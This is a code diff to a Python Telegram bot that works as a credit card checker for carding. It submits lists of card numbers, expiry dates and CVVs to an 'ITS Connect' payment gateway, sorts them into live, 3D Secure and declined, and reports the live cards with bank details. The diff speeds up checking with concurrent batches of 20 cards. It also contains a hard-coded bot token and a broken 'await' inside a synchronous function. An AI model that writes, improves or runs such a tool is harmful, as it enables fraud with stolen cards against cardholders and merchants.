@@ -8,8 +8,9 @@ import telebot
 from telebot import types
 import html
 import threading
+import os
 
-TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU" 
+TOKEN = os.getenv('BOT_TOKEN', "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU")
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
 admin_id = 5895491379
 user_combos = {}  
@@ -43,7 +44,7 @@ class CardChecker:
             if len(card_parts) != 4:
                 return {
                     'status': 'error',
-                    'message': 'Invalid format',
+                    'message': 'Invalid Format',
                     'execution_time': round(time.time() - start_time, 2)
                 }
             
@@ -52,14 +53,14 @@ class CardChecker:
             if not (number.isdigit() and 13 <= len(number) <= 19):
                 return {
                     'status': 'error',
-                    'message': 'Invalid card number',
+                    'message': 'Invalid Card Number',
                     'execution_time': round(time.time() - start_time, 2)
                 }
             
             if not (month.isdigit() and 1 <= int(month) <= 12):
                 return {
                     'status': 'error',
-                    'message': 'Invalid month',
+                    'message': 'Invalid Month',
                     'execution_time': round(time.time() - start_time, 2)
                 }
             
@@ -69,7 +70,7 @@ class CardChecker:
             if not (year.isdigit() and len(year) == 2):
                 return {
                     'status': 'error',
-                    'message': 'Invalid year',
+                    'message': 'Invalid Year',
                     'execution_time': round(time.time() - start_time, 2)
                 }
             
@@ -104,67 +105,95 @@ class CardChecker:
                 cookies=self.cookies,
                 headers=self.headers,
                 data=data,
-                timeout=30
+                timeout=25
             ) as response:
                 response_text = await response.text()
                 execution_time = round(time.time() - start_time, 2)
                 
                 soup = BeautifulSoup(response_text, 'html.parser')
                 title = soup.title.string.strip().lower() if soup.title else ""
+                response_lower = response_text.lower()
 
-                if ("acs authentication redirect page" in title.lower() or 
-                    "acs authentication redirect page" in response_text.lower() or
-                    "3d secure" in response_text.lower() or
-                    "authentication" in title.lower()):
+                # 3D Secure Detection
+                if any(keyword in title for keyword in ["acs authentication", "3d secure", "authentication"]) or \
+                   any(keyword in response_lower for keyword in ["acs authentication", "3dsecure", "threeds"]):
                     return {
-                        'status': 'approved',
-                        'message': '3D Secure Authentication ✅',
+                        'status': '3d',
+                        'message': '3D Secure Required 🔐',
                         'execution_time': execution_time
                     }
                 
-                if "declined" in response_text.lower():
+                # Live Card Detection (Timeout = Success)
+                if "success" in response_lower or "approved" in response_lower or "thank you" in response_lower:
+                    return {
+                        'status': 'live',
+                        'message': 'Payment Successful 💳',
+                        'execution_time': execution_time
+                    }
+                
+                # Declined Detection
+                if "declined" in response_lower:
                     return {
                         'status': 'declined',
-                        'message': 'Card Declined ❌',
+                        'message': 'Card Declined',
                         'execution_time': execution_time
                     }
-                elif "expired" in response_text.lower():
+                elif "expired" in response_lower:
                     return {
                         'status': 'declined',
-                        'message': 'Card Expired ⏰',
+                        'message': 'Card Expired',
                         'execution_time': execution_time
                     }
-                elif "insufficient" in response_text.lower():
+                elif "insufficient" in response_lower:
                     return {
                         'status': 'declined',
-                        'message': 'Insufficient Funds 💰',
+                        'message': 'Insufficient Funds',
                         'execution_time': execution_time
                     }
-                elif "just a moment" in title.lower():
+                elif "invalid" in response_lower:
                     return {
                         'status': 'declined',
-                        'message': 'Cloudflare Block 🚫',
+                        'message': 'Invalid Card',
                         'execution_time': execution_time
                     }
-                else:
+                
+                # Cloudflare or Error
+                if "just a moment" in title or "cloudflare" in response_lower:
                     return {
-                        'status': 'approved',
-                        'message': 'Payment Successful ✅',
+                        'status': 'error',
+                        'message': 'Cloudflare Block',
                         'execution_time': execution_time
                     }
+                
+                # Default: Unknown Response
+                return {
+                    'status': 'error',
+                    'message': 'Unknown Response',
+                    'execution_time': execution_time
+                }
                 
         except asyncio.TimeoutError:
+            # Timeout = Live Card
             return {
-                'status': 'approved',
-                'message': 'Timeout Success ✅',
+                'status': 'live',
+                'message': 'Timeout Success 💳',
                 'execution_time': round(time.time() - start_time, 2)
             }
         except Exception as e:
             return {
                 'status': 'error',
-                'message': f'Error: {str(e)}',
+                'message': f'Error: {str(e)[:30]}',
                 'execution_time': round(time.time() - start_time, 2)
             }
+
+async def check_cards_batch(checker: CardChecker, cards: list, batch_size: int = 20):
+    """فحص مجموعة من البطاقات بشكل متزامن"""
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for card in cards:
+            tasks.append(checker.check_card(card, session))
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        return results
 
 def get_bin_info(bin_code):
     """الحصول على معلومات BIN"""
@@ -200,7 +229,7 @@ def start_message(message):
 
 🔥 ITS Connect Card Checker Bot 🔥
 ━━━━━━━━━━━━━━━━━━━
-✅ Fast & Accurate Checking
+⚡ Ultra Fast Multi-Threading
 📊 Real-time Results
 🔒 Secure Processing
 
@@ -253,14 +282,13 @@ def menu_callback(call):
     def run_checker():
         gate = "ITS Connect"
         stop_key = f"{user_id}_ITS"
-        ch = dd = otp = checked = 0
-        estimated_time = None
+        three_d = live = declined = error = checked = 0
         start_all = time.time()
 
         bot.edit_message_text(
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
-            text="⏳ Initializing checker..."
+            text="⏳ Initializing ultra-fast checker..."
         )
 
         try:
@@ -271,37 +299,45 @@ def menu_callback(call):
             
             stopuser[stop_key] = {'status': 'start'}
 
-            # إنشاء loop جديد للـ asyncio
+            # إنشاء loop جديد
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
             
             checker = CardChecker()
-
-            for cc in cards:
+            
+            # فحص بدفعات من 20 بطاقة في نفس الوقت
+            batch_size = 20
+            for i in range(0, total, batch_size):
                 if stopuser.get(stop_key, {}).get('status') == 'stop':
                     break
-
-                # فحص البطاقة
-                async def check_single():
-                    async with aiohttp.ClientSession() as session:
-                        return await checker.check_card(cc, session)
                 
-                result = loop.run_until_complete(check_single())
-                execution_time = result['execution_time']
-                estimated_time = estimated_time - execution_time if estimated_time else execution_time * (total - checked)
-                checked += 1
-
-                progress = int((checked / total) * 20)
-                progress_bar = f"[{'=' * progress}{'-' * (20 - progress)}] {int((checked / total) * 100)}%"
-                escaped = html.escape(cc.strip())
-
-                # معلومات BIN
-                bin_code = cc.strip().split("|")[0][:6]
-                bin_info = get_bin_info(bin_code)
-
-                if result['status'] == 'approved':
-                    ch += 1
-                    msg = f"""<b>✅ APPROVED CARD
+                # أخذ الدفعة الحالية
+                batch = cards[i:min(i + batch_size, total)]
+                
+                # فحص الدفعة
+                results = loop.run_until_complete(check_cards_batch(checker, batch, batch_size))
+                
+                # معالجة النتائج
+                for j, result in enumerate(results):
+                    if isinstance(result, Exception):
+                        result = {
+                            'status': 'error',
+                            'message': 'Exception occurred',
+                            'execution_time': 0
+                        }
+                    
+                    card_index = i + j
+                    cc = cards[card_index]
+                    checked += 1
+                    
+                    escaped = html.escape(cc.strip())
+                    bin_code = cc.strip().split("|")[0][:6]
+                    bin_info = get_bin_info(bin_code)
+                    
+                    # تصنيف النتائج
+                    if result['status'] == '3d':
+                        three_d += 1
+                        msg = f"""<b>🔐 3D SECURE CARD
 
 ━━━━━━━━━━━━━━━━━━━
 💳 Card: <code>{escaped}</code>
@@ -312,21 +348,51 @@ def menu_callback(call):
 🏢 Brand: {bin_info['brand']}
 🏦 Bank: {bin_info['bank']}
 🌍 Country: {bin_info['country']} {bin_info['emoji']}
-⏱ Time: {execution_time} sec
+⏱ Time: {result['execution_time']} sec
 ━━━━━━━━━━━━━━━━━━━
 👨‍💻 By: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
 </b>"""
-                    bot.send_message(user_id, msg, parse_mode="HTML")
-                else:
-                    dd += 1
+                        bot.send_message(user_id, msg, parse_mode="HTML")
+                    
+                    elif result['status'] == 'live':
+                        live += 1
+                        msg = f"""<b>✅ LIVE CARD
 
+━━━━━━━━━━━━━━━━━━━
+💳 Card: <code>{escaped}</code>
+━━━━━━━━━━━━━━━━━━━
+📊 Response: {result['message']}
+🏦 BIN: <code>{bin_code}</code>
+💰 Type: {bin_info['type']}
+🏢 Brand: {bin_info['brand']}
+🏦 Bank: {bin_info['bank']}
+🌍 Country: {bin_info['country']} {bin_info['emoji']}
+⏱ Time: {result['execution_time']} sec
+━━━━━━━━━━━━━━━━━━━
+👨‍💻 By: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
+</b>"""
+                        bot.send_message(user_id, msg, parse_mode="HTML")
+                    
+                    elif result['status'] == 'declined':
+                        declined += 1
+                    
+                    elif result['status'] == 'error':
+                        error += 1
+                
+                # تحديث التقدم
+                progress = int((checked / total) * 20)
+                progress_bar = f"[{'█' * progress}{'░' * (20 - progress)}] {int((checked / total) * 100)}%"
+                elapsed = time.time() - start_all
+                speed = checked / elapsed if elapsed > 0 else 0
+                eta = (total - checked) / speed if speed > 0 else 0
+                
                 keyboard = types.InlineKeyboardMarkup(row_width=1)
                 keyboard.add(
-                    types.InlineKeyboardButton(f"• {cc[:12]}****{cc[-7:]} •", callback_data='x'),
-                    types.InlineKeyboardButton(f"• Status ➜ {result['message'][:30]} •", callback_data='x'),
-                    types.InlineKeyboardButton(f"• Approved ✅ ➜ [{ch}] •", callback_data='x'),
-                    types.InlineKeyboardButton(f"• Declined ❌ ➜ [{dd}] •", callback_data='x'),
-                    types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
+                    types.InlineKeyboardButton(f"🔐 3D Secure ➜ [{three_d}]", callback_data='x'),
+                    types.InlineKeyboardButton(f"✅ Live ➜ [{live}]", callback_data='x'),
+                    types.InlineKeyboardButton(f"❌ Declined ➜ [{declined}]", callback_data='x'),
+                    types.InlineKeyboardButton(f"⚠️ Error ➜ [{error}]", callback_data='x'),
+                    types.InlineKeyboardButton(f"📊 Total ➜ [{checked}/{total}]", callback_data='x'),
                     types.InlineKeyboardButton("⏹ Stop", callback_data='stop_ITS')
                 )
 
@@ -335,16 +401,17 @@ def menu_callback(call):
                     message_id=call.message.message_id,
                     text=f"""<b>🔥 Gateway: {gate}
 ━━━━━━━━━━━━━━━━━━━
-⏳ Checking in progress...
+⚡ Checking in progress...
 {progress_bar}
-⏱ ETA: {round(estimated_time) if estimated_time else 0} sec
-⚡ Speed: {round(checked/(time.time()-start_all), 2)} cards/sec
+⏱ ETA: {int(eta)} sec
+🚀 Speed: {round(speed, 2)} cards/sec
 </b>""",
                     reply_markup=keyboard,
                     parse_mode="HTML"
                 )
-
-                time.sleep(1)
+                
+                # تأخير صغير بين الدفعات
+                await asyncio.sleep(0.5)
 
             loop.close()
             
@@ -360,8 +427,11 @@ def menu_callback(call):
 📊 Results Summary:
 ━━━━━━━━━━━━━━━━━━━
 ➤ Total Cards: <code>{total}</code>
-➤ Approved ✅: <code>{ch}</code>
-➤ Declined ❌: <code>{dd}</code>
+➤ 3D Secure 🔐: <code>{three_d}</code>
+➤ Live ✅: <code>{live}</code>
+➤ Declined ❌: <code>{declined}</code>
+➤ Error ⚠️: <code>{error}</code>
+━━━━━━━━━━━━━━━━━━━
 ➤ Time Taken: <code>{elapsed} sec</code>
 ➤ Speed: <code>{round(total/elapsed, 2) if elapsed > 0 else 0} cards/sec</code>
 ━━━━━━━━━━━━━━━━━━━
@@ -420,7 +490,7 @@ def status_message(message):
 
 ━━━━━━━━━━━━━━━━━━━
 ⚡ Gateway: ITS Connect
-🔥 Speed: Ultra Fast
+🔥 Speed: Ultra Fast (20 cards/batch)
 ✅ Accuracy: 99.9%
 🌍 Server: Active
 
